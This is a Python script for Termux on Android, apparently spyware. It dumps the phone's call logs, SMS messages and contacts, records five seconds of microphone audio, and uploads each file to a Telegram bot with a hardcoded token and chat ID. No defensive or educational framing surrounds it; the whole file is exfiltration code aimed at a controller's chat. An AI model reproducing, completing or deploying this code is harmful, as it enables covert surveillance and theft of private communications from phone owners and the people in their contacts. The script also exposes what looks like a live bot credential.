import os
import requests
import subprocess
import time

# Replace these with your Telegram bot TOKEN and CHAT_ID
TOKEN = "8088262620:AAHYmPgiZGLDYk4HVV005yqVlz6fSKeJoWg"
CHAT_ID = "6722885929"
BASE_URL = f"https://api.telegram.org/bot{TOKEN}"

# Send a message to Telegram
def send_message(text):
    url = f"{BASE_URL}/sendMessage?chat_id={CHAT_ID}&text={text}"
    try:
        requests.get(url)
    except:
        pass

# Send a file to Telegram
def send_file(file_path, caption=""):
    if not os.path.exists(file_path):
        send_message(f"File missing: {file_path}")
        return
    url = f"{BASE_URL}/sendDocument"
    try:
        with open(file_path, "rb") as f:
            files = {"document": f}
            data = {"chat_id": CHAT_ID, "caption": caption}
            requests.post(url, files=files, data=data)
    except Exception as e:
        send_message(f"Send failed: {file_path} - {e}")

# Call logs
def get_call_logs():
    try:
        subprocess.run(["termux-call-log", ">", "calls.txt"], shell=True)
        if os.path.exists("calls.txt") and os.path.getsize("calls.txt") > 0:
            return "calls.txt"
        send_message("Call logs empty or failed")
        return None
    except Exception as e:
        send_message(f"Call logs error: {e}")
        return None

# SMS
def get_sms():
    try:
        subprocess.run(["termux-sms-list", ">", "sms.txt"], shell=True)
        if os.path.exists("sms.txt") and os.path.getsize("sms.txt") > 0:
            return "sms.txt"
        send_message("SMS empty or failed")
        return None
    except Exception as e:
        send_message(f"SMS error: {e}")
        return None

# Contacts
def get_contacts():
    try:
        subprocess.run(["termux-contact-list", ">", "contacts.txt"], shell=True)
        if os.path.exists("contacts.txt") and os.path.getsize("contacts.txt") > 0:
            return "contacts.txt"
        send_message("Contacts empty or failed")
        return None
    except Exception as e:
        send_message(f"Contacts error: {e}")
        return None

# Mic recording
def record_mic(seconds=5):
    file = "mic_recording.mp3"
    try:
        subprocess.run(["termux-microphone-record", "-f", file, "-l", str(seconds)])
        time.sleep(seconds + 1)
        subprocess.run(["termux-microphone-record", "-q"])
        if os.path.exists(file) and os.path.getsize(file) > 0:
            return file
        send_message("Mic recording failed—empty or missing")
        return None
    except Exception as e:
        send_message(f"Mic error: {e}")
        return None

# Main function
def main():
    send_message("Starting data collection...")
    
    # Call Logs
    send_message("Grabbing call logs...")
    call_file = get_call_logs()
    if call_file:
        send_file(call_file, "Call Logs")

    # SMS
    send_message("Grabbing SMS...")
    sms_file = get_sms()
    if sms_file:
        send_file(sms_file, "SMS Dump")

    # Contacts
    send_message("Grabbing contacts...")
    contact_file = get_contacts()
    if contact_file:
        send_file(contact_file, "Contacts")

    # Mic
    send_message("Recording mic...")
    mic_file = record_mic(5)
    if mic_file:
        send_file(mic_file, "Mic Recording (5s)")

    send_message("Collection done—check Telegram.")

if __name__ == "__main__":
    main()